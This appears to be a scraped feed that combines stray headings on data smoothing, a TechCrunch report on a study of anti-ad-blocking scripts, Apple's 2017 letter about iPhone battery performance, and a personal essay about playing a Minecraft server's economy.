&lt;h3&gt;The Savitzky-Golay smooth is now the most often mentioned data smoothing technique. (What was going on the &quot;triangular smooth&quot; in the 1800s?)&lt;/h3&gt;

&lt;h3&gt;The Gaussian profile is the most commonly encountered peak shape.&lt;/h3&gt;

&lt;h3&gt;Measures of precision in the presence of random noise increased with the availability of electronic instrumentation.&lt;/h3&gt;

<title>Many major websites are taking silent anti-ad-blocking measures</title>

<description>&lt;img src=&quot;https://tctechcrunch2011.files.wordpress.com/2017/03/software-vc-money.jpg?w=738&quot; class=&quot;&quot;/&gt;&lt;p id=&quot;speakable-summary&quot;&gt;It’s no secret that ad blockers are putting a dent in advertising-based business models on the web. This has produced a range of reactions, from relatively polite whitelisting asks (TechCrunch does this) to dynamic redeployment of ads to avoid blocking. A new study finds that nearly a third of the top 10,000 sites on the web are taking ad blocking countermeasures, many silent and highly sophisticated.&lt;/p&gt;&lt;p&gt;Seeing the uptick in anti-ad-blocking tech, University of Iowa and UC Riverside researchers &lt;a target=&quot;_blank&quot; href=&quot;http://homepage.divms.uiowa.edu/~mshafiq/files/adblock-ndss2018.pdf&quot; rel=&quot;noopener&quot;&gt;decided to perform a closer scrutiny (PDF)&lt;/a&gt; of major sites than had previously been done. Earlier estimates, based largely on visible or obvious anti-ad-blocking means such as pop-ups or broken content, suggested that somewhere between 1 and 5 percent of popular sites were doing this — but the real number seems to be an order of magnitude higher.&lt;/p&gt;
&lt;p&gt;The researchers visited thousands of sites multiple times, with and without ad-blocking software added to the browser. By comparing the final rendered code of the page for blocking browsers versus non-blocking browsers, they could see when pages changed content or noted the presence of a blocker, even if they didn’t notify the user.&lt;/p&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png&quot; rel=&quot;noopener&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-1581451&quot; src=&quot;https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png?w=598&amp;amp;h=250&quot; alt=&quot;&quot; width=&quot;598&quot; height=&quot;250&quot; srcset=&quot;https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png 598w, https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png?w=150&amp;amp;h=63 150w, https://tctechcrunch2011.files.wordpress.com/2017/12/topxk.png?w=300&amp;amp;h=125 300w&quot; sizes=&quot;(max-width: 598px) 100vw, 598px&quot;/&gt;&lt;/a&gt;As you can see above, 30.5 percent of the top 10,000 sites on the web as measured by Alexa are using some sort of ad-blocker detection, and 38.2 percent of the top 1,000. (Again, TechCrunch is among these, but to my knowledge we just ask visitors to whitelist the site.)&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;Our results show that anti-adblockers are much more pervasive than previously reported…our hypothesis is that a much larger fraction of websites than previously reported are “worried” about adblockers but many are not employing retaliatory actions against adblocking users yet.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It turns out that many ad providers are offering anti-blocking tech in the form of scripts that produce a variety of “bait” content that’s ad-like — for instance, images or elements named and tagged in such a way that they will trigger ad blockers, tipping the site off. The pattern of blocking, for instance not loading any divs marked “banner_ad” but loading images with “banner” in the description, further illuminates the type and depth of ad blocking being enforced by the browser.&lt;/p&gt;
&lt;p&gt;Sites can simply record this for their own purposes (perhaps to gauge the necessity of responding) or redeploy ads in such a way that the detected ad blocker won’t catch.&lt;/p&gt;

&lt;p&gt;In addition to detecting these new and increasingly common measures being taken by advertisers, the researchers suggest some ways that current ad blockers may be able to continue functioning as intended.&lt;/p&gt;
&lt;p&gt;One way involves dynamically rewriting the JavaScript code that checks for a blocker, forcing it to think there is no blocker. However, this could break some sites that render as if there is no blocker when there actually is.&lt;/p&gt;
&lt;p&gt;A second method identifies the “bait” content and fails to block it, making the site think there’s no blocker in the browser and therefore render ads as normal — except the real ads &lt;em&gt;will&lt;/em&gt; be blocked.&lt;/p&gt;
&lt;p&gt;That will, of course, provoke new and even more sophisticated measures by the advertisers, and so on. As the paper concludes:&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;To keep up the pressure on publishers and advertisers in the long term, we believe it is crucial that adblockers keep pace with anti-adblockers in the rapidly escalating technological arms race. Our work represents an important step in this direction.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The study has been submitted for consideration at the Network and Distributed Systems Security Symposium in February of 2018.&lt;/p&gt;

<title>A Message to Our Customers about iPhone Batteries and Performance</title>
<link>https://www.apple.com/iphone-battery-and-performance/</link>
<guid isPermaLink="true" >https://www.apple.com/iphone-battery-and-performance/</guid>
<description>&lt;h2 class=&quot;typography-eyebrow-reduced&quot;&gt;December 28, 2017&lt;/h2&gt;

&lt;p&gt;We’ve been hearing feedback from our customers about the way we handle performance for iPhones with older batteries and how we have communicated that process. We know that some of you feel Apple has let you down. We apologize. There’s been a lot of misunderstanding about this issue, so we would like to clarify and let you know about some changes we’re making.&lt;/p&gt;
&lt;p&gt;First and foremost, we have never — and would never — do anything to intentionally shorten the life of any Apple product, or degrade the user experience to drive customer upgrades. Our goal has always been to create products that our customers love, and making iPhones last as long as possible is an important part of that.&lt;/p&gt;
&lt;h3 class=&quot;typography-label&quot;&gt;How batteries age&lt;/h3&gt;
&lt;p&gt;All rechargeable batteries are consumable components that become less effective as they chemically age and their ability to hold a charge diminishes. Time and the number of times a battery has been charged are not the only factors in this chemical aging process.&lt;/p&gt;
&lt;p&gt;Device use also affects the performance of a battery over its lifespan. For example, leaving or charging a battery in a hot environment can cause a battery to age faster. These are characteristics of battery chemistry, common to lithium-ion batteries across the industry.&lt;/p&gt;
&lt;p&gt;A chemically aged battery also becomes less capable of delivering peak energy loads, especially in a low state of charge, which may result in a device unexpectedly shutting itself down in some situations.&lt;/p&gt;
&lt;p&gt;To help customers learn more about iPhone’s rechargeable battery and the factors affecting its performance, we’ve posted a new support article, &lt;a href=&quot;https://support.apple.com/HT208387&quot;&gt;iPhone Battery and Performance&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It should go without saying that we think sudden, unexpected shutdowns are unacceptable. We don’t want any of our users to lose a call, miss taking a picture or have any other part of their iPhone experience interrupted if we can avoid it.&lt;/p&gt;
&lt;h3 class=&quot;typography-label&quot;&gt;Preventing unexpected shutdowns&lt;/h3&gt;
&lt;p&gt;About a year ago in iOS 10.2.1, we delivered a software update that improves power management during peak workloads to avoid unexpected shutdowns on iPhone 6, iPhone 6 Plus, iPhone 6s, iPhone 6s Plus, and iPhone SE. With the update, iOS dynamically manages the maximum performance of some system components when needed to prevent a shutdown. While these changes may go unnoticed, in some cases users may experience longer launch times for apps and other reductions in performance.&lt;/p&gt;
&lt;p&gt;Customer response to iOS 10.2.1 was positive, as it successfully reduced the occurrence of unexpected shutdowns. We recently extended the same support for iPhone 7 and iPhone 7 Plus in iOS 11.2.&lt;/p&gt;
&lt;p&gt;Of course, when a chemically aged battery is replaced with a new one, iPhone performance returns to normal when operated in standard conditions.&lt;/p&gt;
&lt;h3 class=&quot;typography-label&quot;&gt;Recent user feedback&lt;/h3&gt;
&lt;p&gt;Over the course of this fall, we began to receive feedback from some users who were seeing slower performance in certain situations. Based on our experience, we initially thought this was due to a combination of two factors: a normal, temporary performance impact when upgrading the operating system as iPhone installs new software and updates apps, and minor bugs in the initial release which have since been fixed.&lt;/p&gt;
&lt;p&gt;We now believe that another contributor to these user experiences is the continued chemical aging of the batteries in older iPhone 6 and iPhone 6s devices, many of which are still running on their original batteries.&lt;/p&gt;
&lt;h3 class=&quot;typography-label&quot;&gt;Addressing customer concerns&lt;/h3&gt;
&lt;p&gt;We’ve always wanted our customers to be able to use their iPhones as long as possible. We’re proud that Apple products are known for their durability, and for holding their value longer than our competitors’ devices.&lt;/p&gt;
&lt;p&gt;To address our customers’ concerns, to recognize their loyalty and to regain the trust of anyone who may have doubted Apple’s intentions, we’ve decided to take the following steps:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Apple is reducing the price of an out-of-warranty iPhone battery replacement by $50 — from $79 to $29 — for anyone with an iPhone 6 or later whose battery needs to be replaced, starting in late January and available worldwide through December 2018. Details will be provided soon on &lt;a href=&quot;https://www.apple.com/&quot;&gt;apple.com&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Early in 2018, we will issue an iOS software update with new features that give users more visibility into the health of their iPhone’s battery, so they can see for themselves if its condition is affecting performance.&lt;/li&gt;
&lt;li&gt;As always, our team is working on ways to make the user experience even better, including improving how we manage performance and avoid unexpected shutdowns as batteries age.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;At Apple, our customers’ trust means everything to us. We will never stop working to earn and maintain it. We are able to do the work we love only because of your faith and support — and we will never forget that or take it for granted.&lt;/p&gt;

<description>&lt;center readability=&quot;6&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/title.png&quot; /&gt;&lt;p&gt;Those of us with the means to do as we pleased drove our vast resources into monumental construction. My grandest project was a Chinese city, tragically cut short by server reset. View from the north, inside the outer wall.&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;The first game I ever outsmarted was Final Fantasy 6. I was eight or nine. The rafting level after the Returners' hideout. You're shunted along on a rail, forced into a series of fights that culminate with a boss encounter. You have a temporary party member, Banon, with a zero-cost, group-target heal. The only status ailment the river enemies apply is Darkness, but as a consequence of an infamous bug with the game's evade mechanic, it does nothing. The river forks at two points, and the &quot;wrong&quot; choice at one of the forks sends the raft in a loop. There is a setting that makes the game preserve cursor positions for each character across battles.&lt;/p&gt;
&lt;p&gt;I set everything up just right, placed a stack of quarters on the A button, turned off the television, and went to sleep.&lt;/p&gt;
&lt;p&gt;I've always loved knowable systems. People are messy and complicated, but systems don't lie to you. Understand how all the parts work, understand how all the parts interact, and you can construct a perfect model of the whole thing in your head. Of course it's more complicated than that. Many people can be understood well enough for practical purposes as mechanical systems, and actual mechanical systems can be impossibly complex and plenty inscrutable. There are entire classes of software vulnerabilities that leverage physical properties of the hardware they run on, properties sufficiently abstracted away that most programmers have never in their lives considered them. But the thought is nice. I dreamed of going into constitutional law as a kid, back when I thought law was a perfect system, with outputs purely a function of inputs, that could be learned and trusted. I got fairly decent at interacting with people basically the same way you train a neural net, dumbly adjusting weights to minimize a loss function until I stumbled into something &quot;good enough.&quot; I have to physically suppress the urge to hedge nearly everything I say with, &quot;Well, it's way more complicated than this, but...&quot;&lt;/p&gt;
&lt;p&gt;So I know what I like, at least. Games scratched for a while this itch I have. Outright cheating always kind of bored me. Any asshole could plug in a Game Genie and look up codes online. (It had not occurred to me, as a child, that these &quot;codes&quot; were actually modifications to learnable systems themselves.) What I liked was playing within the confines of the rules, building an understanding of how the thing worked, then finding some leverage and exploiting the hell out of it. It's an interesting enough pursuit on its own, but all that gets cranked up an order of magnitude online. You're still just tinkering with systems. Watching how they function absent your influence, testing some inputs and observing the outputs, figuring things out, and taking control. But now you have marks, competition, and an audience. And just, like, people. People affect the system and become part of the system and make things so much more complex that the joy of figuring it all out is that much greater.&lt;/p&gt;
&lt;p&gt;After sinking 10-20k hours into a single MMO and accomplishing a lot of unbelievable things within the confines of its gargantuan ruleset, it is generally pretty easy for me to pick up another game and figure out what makes it tick. I'll tell the story about that whole experience sometime, but it's a long tale to tell. This is about one of those other games: Minecraft.&lt;/p&gt;
&lt;center readability=&quot;14&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/city-map.png&quot; /&gt;&lt;p&gt;Classical Chinese cityplanning divided the space of a city into nine congruant squares, numbered to sum to 15 in all directions. Everything was oriented on a north-south axis, with all important buildings facing south (here toward bottom-right.) The palace sat in the center, protected by its own wall with gatehouses and corner towers more ornate than those on the outer. The court sat in front of the sanctum, the market behind, the temple to the ancestors to the left, and temples to agriculture on the right. This all derives from the Rites of Zhou, and is presumed to be the exact layout of their first capital, Chengzhou, before the flight to Wangcheng.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;The Players (names changed)&lt;/h2&gt;
&lt;dl&gt;&lt;dt&gt;Alice&lt;/dt&gt;
&lt;dd&gt;Ok this name wasn't changed.&lt;/dd&gt;
&lt;dt&gt;Emma&lt;/dt&gt;
&lt;dd&gt;Breathtaking builder with nigh-limitless cash reserves. Often called the queen of the server and earned the hell out of the title. She'd buy items at three times market just because she needed lots fast, and she bought so much &lt;em&gt;her&lt;/em&gt; price became &lt;em&gt;the&lt;/em&gt; price. And the builds she made with them were truly remarkable. Living legend.&lt;/dd&gt;
&lt;dt&gt;Samantha&lt;/dt&gt;
&lt;dd&gt;Before the currency was backed by experience points, she built the fastest mob grinder on the server and made an ungodly amount of money selling enchantments. Would quit for months, come back, and shake the economy up like no one else.&lt;/dd&gt;
&lt;dt&gt;Victoria&lt;/dt&gt;
&lt;dd&gt;Chief architect of an extensive rail network in the nether. Kept a finger on the pulse of the economy and bled it for all it was worth. Played the market like a harp. A lot of our best schemes were Victoria's schemes.&lt;/dd&gt;
&lt;/dl&gt;&lt;p&gt;By the time of the Crash, we four were among the most influential people in the economy. By the end of the recovery from it, we owned the economy. The cartel we formed to pull the market back from the brink had about a half-dozen other significant players, and everyone contributed plenty, but for the most part the four of us called the shots and had the capital to back it up. When the server was wiped for biome update, we vaulted every hurdle, most of which were put in place &lt;em&gt;specifically&lt;/em&gt; because of us, and reclaimed our riches in a matter of months.&lt;/p&gt;
&lt;dl&gt;&lt;dt&gt;Zel&lt;/dt&gt;
&lt;dd&gt;Market maker. Known for the Emporium, a massive store near the marketplace proper that also bought everything it sold, a rare practice. Got rather wealthy off the spread on items; I almost single-handedly bankrupted them off the price differences &lt;em&gt;between&lt;/em&gt; items. Also wrote our IRC bot, so for a time !alice triggered a lighthearted joke about my ruthlessness.&lt;/dd&gt;
&lt;dt&gt;Lily&lt;/dt&gt;
&lt;dd&gt;Kicked off the wool bubble. Did quite well for herself, as she was a producer rather than a speculator.&lt;/dd&gt;
&lt;dt&gt;Charlotte&lt;/dt&gt;
&lt;dd&gt;Discovered an item duping glitch and crashed the entire economy. Never shared the existence of the vuln &lt;em&gt;or&lt;/em&gt; her exploit for it with a soul, as far as I know. Was obvious to me what she was doing, but only because I understood the economy well enough to know it was impossible any other way. If she'd switched to a burner account and laundered the money, she probably would have gotten away with it. Good kid. Hope she learns to program.&lt;/dd&gt;
&lt;dt&gt;Jill, Frank&lt;/dt&gt;
&lt;dd&gt;Just as lovely as everyone else, but for our purposes, &quot;two wool speculators.&quot;&lt;/dd&gt;
&lt;/dl&gt;&lt;center readability=&quot;4&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/store-exterior.png&quot; /&gt;&lt;p&gt;My main shop in the market, the last in a series of four locations, trading up each time.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;Starting Out&lt;/h2&gt;
&lt;p&gt;Working a game's economy is an interesting pursuit because it, like most interesting pursuits, requires your whole brain to get really good at it. It's both analytical and creative: devise general theories with broad applicability, but retain a willingness to disregard or reevaluate those theories when something contradicts them. And it's fun as hell. There's not much quite like the brainfeel of starting with nothing, carving out a niche, getting a foothold, and snowballing. Game economies are all radically different because there aren't any limits on weird things the designers can do with the game, but they're all fundamentally similar too. Here are the tricks to breaking any of them, as basic as they may be:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Learn the game inside and out. You don't necessarily need to get good at it. I was a terrible player of my MMO for the first couple &lt;em&gt;years&lt;/em&gt; I was involved in top-tier play. My primary role in my guild before I actually got good at the game itself was &quot;in-house mechanics wonk,&quot; and it &lt;em&gt;was&lt;/em&gt; an important role.) But you need to know what &quot;good&quot; is. It's hard to speculate on pork bellies without understanding why people care about pigs in the first place.&lt;/li&gt;
&lt;li&gt;Read the patch notes and keep them in mind. Read the upcoming changes until you know them by heart. Actually &lt;em&gt;think&lt;/em&gt; about how changes to the game will change the market. This is as overpowered as insider trading is in the real economy, except the information is all right there in public. Most players never do this, and you can make a killing in any game by hoarding the things that will be more valuable when the patch hits than they are right now. You would be amazed how fast &quot;I'm so excited about [useless item becoming incredibly useful]!!&quot; turns to &quot;omg why is [suddenly useful item] so expensive :( :(&quot; the moment the patch drops.&lt;/li&gt;
&lt;li&gt;Study a tiny piece of the market. Don't touch it, just watch until you think you understand it. Make a small bet and see whether it pays off. Consider whether your hypothesis was right or whether you just got lucky. Slowly increase the size of your bets. Explore other tiny pieces. Think about how those pieces interact, how they are similar, how they differ. Manage your risk. Accrue capital so you can increase the size of your bets while decreasing your risk of ruin. It's a bit of art and a bit of science, but you can go from dabbling in a few niches to having a complete understanding of the entire market before you even know it.&lt;/li&gt;
&lt;li&gt;Study people. Know your competition and know what makes them tick. Know the major buyers, know the tendencies of the swarms of anonymous buyers.&lt;/li&gt;
&lt;li&gt;Overall just know a lot of things I guess.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;I started on my server with only a rudimentary knowledge of the game itself and ipso facto zero understanding of its economy. Within six months or so, I had perhaps as detailed a mental model of it as one could get. I knew the price ranges of most of the items in the game and everything that all of them were used for. I knew how common they were on the market, who the major sellers were, what their supply chains looked like. I knew how fast they sold through, whether the price was stable or tacking a certain way, and I had tons of theories on ways to play all this to get what I needed and turn a profit while doing it, and nearly all of them were sound. Most of it I didn't even think about. I didn't need to contemplate why, for instance, lumber was both cheaper and more common than it should be, such that I could buy it all and hold, force the price up, corner the market, and keep it that way. I just kind of... &lt;em&gt;knew&lt;/em&gt;, and did it. It's a wonderful feeling, weaving a system into your mind so tight that it's hard to find the stitches after awhile. Highly recommended.&lt;/p&gt;
&lt;center readability=&quot;6&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/city-north-outside.png&quot; /&gt;&lt;p&gt;Approaching the city from the north, outside the outer wall. In general I modelled the structures on the outer wall on the robust Song styles, with the inner more in the ornate Ming fashion. Terraced farms harvestable by water alongside large livestock pens provided all the food I needed.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;Econ Infodump&lt;/h2&gt;
&lt;p&gt;Our server had an economy plugin called QuickShop. It added to the game a currency called marbles. Functionally marbles were nothing more than a number tied to your account. Marbles were backed by experience points, freely convertible in both directions by command. Experience points had intrinsic value because they were used for item enchantments, for instance to increase the mining speed of a tool or the damage of a weapon. Thus all the properties of a proper medium of exchange.&lt;/p&gt;
&lt;p&gt;QuickShop also added, as one might expect, shops. Shops were chests with signs on them that bought or sold a designated item at a designated price. The moderators reserved a tract of land close to spawn as the official marketplace and leased a limited number of plots there to the public. There were many attempts by the playerbase to create competing unofficial markets, to varying degrees of success. The official market also had an official store, which sold certain items that were nearly impossible (cracked stone brick) or literally impossible (spawn eggs, sponge) to get otherwise. There was a plugin to lock chests, a plugin to remove randomness from the enchanting process, a plugin to bound the size of the world, a plugin to warp you between spawn, market, and your designated home. Other than that the server was vanilla survival non-PVP, no weird items or mobs. (In most cases I'm talking about 1.5 unless context implies 1.6/1.7.)&lt;/p&gt;
&lt;p&gt;One marble was equal to two levels of experience. A diamond was generally 18-23M depending on the economy, and as they were extremely useful and their price could generally be relied on to stay in this range, diamonds were an excellent alternative store of value. Stone and dirt were 0.01M, the smallest you could subdivide a marble. In practice currency divisibility was never a source of friction; most resources were bought and sold by the stack (64 blocks) or chest (1728 blocks). Beacons were the most valuable item and ranged anywhere from 2000M to 8000M. Max enchant for an item cost 40-60 levels, ie 80-120M. Anyone who mined diamond without Fortune 3 was a fool, anyone who broke any blocks at all without Efficiency 5 Unbreaking 3 was a scrub. The server had over a few hundred to under a thousand weekly active players, maybe more than a thousand during summer months. Only the top ~1-3% were wealthy enough that we didn't have to mine unless we felt like it and were free to devote all our playing time to Great Works.&lt;/p&gt;
&lt;p&gt;Virtual economies can be quite unlike real-world ones because the physical laws of the space are different, but analogies can be drawn, and the similarities and differences are both fascinating. Due to the warp mechanism, other than near public warp points like spawn and market, land was abundant and low-value--it mattered little whether you were 5000 or 50000 blocks from spawn if you could /home there from anywhere. Property rights were enforced by the admins. Claims worked something like homesteading in that you couldn't just stick a sign in the dirt, but if you worked the land, it was yours. Land could be owned communally, but tenants had no rights except to their movable property. (&quot;Let's build a town together&quot; sometimes worked well. &quot;Hey join my town&quot; never did.) Vandalism and theft were mostly eliminated by the LogBlock panopticon. With suspensions and permabans being the only analogs for physical coercion, the admins derived their monopoly on violence from the fundamental properties of the universe. They used their power very carefully, however, kept in check by the fact that there were zero barriers to exit beyond social ties and time investment. The internet births interesting societies.&lt;/p&gt;
&lt;p&gt;One property of Minecraft itself is items can be grouped into the disjoint sets &quot;renewable&quot; and &quot;nonrenewable&quot;. Nonrenewable resources are just that: a fixed number of them are created when the world is genned, no more will ever exist. Diamond is the big one, both mechanically crucial and totally nonrenewable, hence its excellence as a store of value. The only way to get them is to dig them out of the ground. This isn't a statement on effort or rarity--dirt is nonrenewable, for instance--just the fact that they cannot be created out of thin air.&lt;/p&gt;
&lt;p&gt;Renewable resources &lt;em&gt;can&lt;/em&gt; be created out of thin air. A subset of renewable resources can be farmed; a subset of farmable resources can be autofarmed. Some examples: redstone is technically renewable through villager trading or witch farming, but the cost of the former and the hassle of the latter makes it unfeasible, especially given how commonly it's encountered while diamond mining. Wheat is both renewable and farmable: plant seeds, harvest wheat, get more seeds from that, repeat. Harvesting can be automated with machines that run water over the fields and send the products into hoppers that feed chests. Replanting, however, requires a right click. Cactus is completely autofarmable: cacti grow to three blocks tall, cactus blocks break and drop the item if directly adjacent to another block, cacti grow irrespective of that fact. So you float blocks next to where they'd grow, flowing water underneath to channel the output into a hopper, cactus blocks accumulate forever with zero human intervention.&lt;/p&gt;
&lt;p&gt;The important bit is with farmable resources, you double the size of your farm, you double your output but spend less than double the time each harvest. But the only way to get twice as much diamond is to dig twice as long. Logarithmic vs. linear growth. Autofarmable resources take time to accumulate but time spent harvesting is for practical purposes zero.&lt;/p&gt;
&lt;p&gt;The properties of diamond make it in many ways the most crucial and interesting item in the game. But I'll get to that. First, a story about sheep.&lt;/p&gt;
&lt;center readability=&quot;10&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/city-south-hall.png&quot; /&gt;&lt;p&gt;Approach from the south, audience hall before the main entrance to the inner city. The guardian lions are arranged as is traditional. Male, on the left (from a south-facing perspective), its paw on a ball representing dominance over the world. Female, on the right, its paw on a cub representing nature.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;All's Wool That Ends Wool&lt;/h2&gt;
&lt;p&gt;Sheep function kind of like wheat. You can breed an arbitrary number of them and efficiency increases on a curve, but shearing hundreds of sheep is at least as time-consuming as replanting hundreds of seeds, probably more so. Wool is a much more interesting resource, though. Sixteen different colors, and when building with wool, you generally need particular colors and you need them in bulk. White wool blocks can be dyed individually, but dye cost makes this infeasible for most colors in large batches. You can dye a sheep any color, however, and it will produce that color wool indefinitely.&lt;/p&gt;
&lt;p&gt;Colored wool was notoriously hard to get on the market, and most just took this as a fact of life. People tended to grow their own food because it was relatively low-effort and cost nothing. So it was common to just keep a pen of sheep near the food, dye them when you needed a particular color, shear them over the course of days or weeks until you had enough wool for your build. Market rate for white wool was 0.08M, stable supply and decent demand, perfectly natural price. Colored wool, however...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;You'd need sixteen shop chests rather than just the one, and floorspace in official market shops was valuable because they were size-limited by admin fiat.&lt;/li&gt;
&lt;li&gt;Colored wool sales were virtually impossible to predict. You'd sell out of blue in an instant because someone happened to need blue. Maybe you restock and don't sell another block of blue for a month. So you had to stock everything all the time, meaning you had to have a &lt;em&gt;lot&lt;/em&gt; of sheep.&lt;/li&gt;
&lt;li&gt;You may be the only seller in the market, but you're competing against prospective buyers just doing it themselves. Since it was common knowledge that colored wool wasn't available on the market, people had already gotten used to doing it themselves, in part because...&lt;/li&gt;
&lt;li&gt;Shearing sheep was fucking annoying. Shearing sixteen different pens of sheep for 0.08M a block when most of those blocks would languish most of the time was plain stupid. Sellers lost interest fast, so buyers got used to here-today-gone-tomorrow wool stores and adapted to there never being a reliable source.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;What should have been obvious though was that because of all this, colored wool was simply &lt;em&gt;more valuable&lt;/em&gt;. Plenty of demand, virtually no supply, who gives a shit about the price of &lt;em&gt;white&lt;/em&gt; wool, right? People just assumed because the blocks were mechanically the same, they were worth the same.&lt;/p&gt;
&lt;p&gt;Emma realized this and spread word on the grapevine that colored wool was an untapped market with massive profit potential. (I'm pretty sure she did it because she needed a lot of wool and was hoping for someone to do the work for her.) And whenever Emma said there was money to be made, everyone listened.&lt;/p&gt;
&lt;p&gt;Lily was the first. She bred up hundreds and hundreds of sheep (so many that she had to cull the herd a bit because her FPS cratered whenever she looked at them) and by week's end there was a brand new wool store in the market with a full chest of every single color, plus a sign promising there'd always be more where that came from. She sold for 0.12M and business was good.&lt;/p&gt;
&lt;p&gt;Really good, in fact. Even with the 50% increase, she sheared sheep for hours and could barely stay in stock of &lt;em&gt;any&lt;/em&gt; color, despite the received wisdom that colored wool sold erratically. That's because another player, Jill, was buying out her entire inventory and reselling it across the street for 0.2M. And Jill didn't do too bad for herself either. Pretty soon wool went from a backchannel convo topic to the hottest game in town.&lt;/p&gt;
&lt;p&gt;On the heels of Jill's success, Frank opened his own wool store. Not only did he sell for 0.35M, he &lt;em&gt;bought&lt;/em&gt; via the same doublechest at 0.2M. Lily raised her price to compensate. Zel got in on the action with their own buy/sell doublechests, and everyone said business was booming. Prices kept climbing, and at the height of it, Zel was &lt;em&gt;buying&lt;/em&gt; at 0.5M a block and selling for even more, while all the normals who just wanted a bit of wool here and there complained about the &quot;crazy&quot; market. Sorry guys, they were told, that's what wool is actually worth nowadays.&lt;/p&gt;
&lt;p&gt;Except not quite. No one who wanted wool for consumption was actually paying those prices, it was all wool merchants buying each other out. I knew better than to get involved--it felt a lot like a bubble, so any investment at all carried unacceptable risk. Unless, of course, there was a way to get instant money with zero risk.&lt;/p&gt;
&lt;p&gt;Wool, again, is renewable. It's farmable. Farming it is annoying, sure, but it's dead easy. While the price was climbing on speculation, a new seller nobody had heard of set up his own shop, without much fanfare, selling every color at 0.1M. He'd built his own farm, like they used to back in the olden days of less than a month ago. Jill and I were the only ones who even knew he existed, because every day when he logged in, we kept one eye on the server map. When we saw him warp to market, we raced to his shop to buy out anything he'd restocked. I imagine anyone else who noticed his store just figured it was always empty.&lt;/p&gt;
&lt;p&gt;Jill used his wool to refill her chests. She did decent business. I took everything I bought, however, and immediately dumped it into Zel's buy chests. Quintuple what I paid, not a bad deal at all. As I started to fill their chests up, I sold anything else to Frank and a few other small-time buyers, the objective always being to unload what I bought within the hour. After awhile, &quot;haha where are you getting all this wool from :P&quot; turned to &quot;no seriously alice where are you getting all this wool from.&quot; The bottom fell out of the market as the speculators shifted from &quot;turn a profit&quot; to &quot;cut my losses&quot; to &quot;sell sell sell.&quot; Colored wool corrected to the nice sensible price of 0.12M and all was right with the world.&lt;/p&gt;
&lt;center readability=&quot;3&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/city-south-courtyard.png&quot; /&gt;&lt;p&gt;Through the audience hall, a courtyard before the gatehouse guarding the inner city.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;&quot;It's Your Money, and I Need It Now!&quot;&lt;/h2&gt;
&lt;p&gt;Buy chests can be a real bitch. Emma, Victoria, and I used them extensively, but we used them &lt;em&gt;right&lt;/em&gt;. Most people didn't use them. Most everyone else who did used them very, very wrong.&lt;/p&gt;
&lt;p&gt;If you set a chest to buy an item at some price, it is possible for anyone at any time to sell you 1728 of that item. If you do this, you'd better be damn sure you want 1728 of that item. If you don't, you can pad out the chest with garbage to reduce its capacity. Set up a buy chest for say diamonds, put dirt blocks in 26 of the slots, now you can't be sold more than 64 diamonds. No one ever did this. I'm not sure it even occurred to most people that it was possible. One thing I got very, very used to seeing was the helpful message, &quot;Failed to sell N items: player can only afford M.&quot;&lt;/p&gt;
&lt;p&gt;As long as you knew what you were doing though, buy chests were beautiful tools.&lt;/p&gt;
&lt;p&gt;Emma liked to buy materials for her builds for more than what people were selling. (Naturally, she first bought out every seller in the market.) Her prices were so good that people would spend hours a day doing the boring work for her. That's how I got my start, too--sold her maybe 15000 blocks of clay at 1M per over the course of a couple weeks. Enough capital to get me established, and within a month or two after that, playing the market made me enough cash that I didn't have to mine for anything.&lt;/p&gt;
&lt;p&gt;Buying for less than market rate worked great too, if you didn't mind waiting. This is what I tended to do, both for things I needed and for things I turned around and sold at a markup. I rarely set up a buy chest that I didn't intend to keep open for months, and I adjusted my prices to change my burn rate rather than ever stop buying. It worked beautifully because over time people came to rely on my buy chests and could trust they weren't going away. I accumulated a group of regulars who sold to me because they knew I was always buying, and word of mouth drove more to me too. &quot;Are ink sacs worth anything?&quot; the newbie asks. &quot;Yep, Alice buys those,&quot; says the good samaritan, who then brings them right to my door. Splendid.&lt;/p&gt;
&lt;p&gt;Victoria did plenty of that kind of business too, but my favorite hustle of hers was her farm. She had on her land wheat fields, livestock pens, a tree farm, and various other such things. I mean, we all did, but she set up buy chests for all those goods right there at something like a quarter market rate. I was way the hell in the middle of nowhere, so it wouldn't have worked for me, but she &lt;em&gt;also&lt;/em&gt; had the nether rail. &quot;Take the white line to the third stop and you're right there!&quot; And people would go work her fields, shear her sheep, chop down her trees, replant everything, and immediately sell her the goods at rock-bottom prices.&lt;/p&gt;
